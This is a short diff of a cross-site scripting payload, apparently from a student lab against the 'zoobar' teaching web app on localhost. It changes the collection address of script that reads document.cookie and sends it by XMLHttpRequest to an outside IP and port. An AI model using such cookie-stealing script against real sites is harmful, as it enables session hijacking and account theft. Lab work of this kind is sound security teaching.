@@ -6,7 +6,7 @@ http://localhost:8080/zoobar/index.cgi/users?user=" size=10>
     }
     
     var req = new XMLHttpRequest();
-    var ip        = "172.27.22.170:12345";
+    var ip        = "172.27.22.243:12345";
     var cookie    = encodeURIComponent(document.cookie);
     var rollno    = "13265";
     var random    = Math.floor((Math.random() * 1000) + 1);
